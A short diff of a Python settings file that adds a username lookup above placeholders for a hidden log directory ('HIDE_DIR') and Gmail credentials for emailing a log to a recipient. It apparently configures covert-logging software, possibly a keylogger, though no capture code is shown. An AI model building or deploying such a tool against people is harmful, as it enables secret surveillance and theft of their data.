@@ -1,3 +1,6 @@
+# Get the username from the environment or password database
+from getpass import getuser
+
 # TODO: Initialize the directory where you store the log file,
 # Gmail address and smtp password of the sender and Gmail address of recipient
 HIDE_DIR =  "./"        # Directory that you want to store the log file
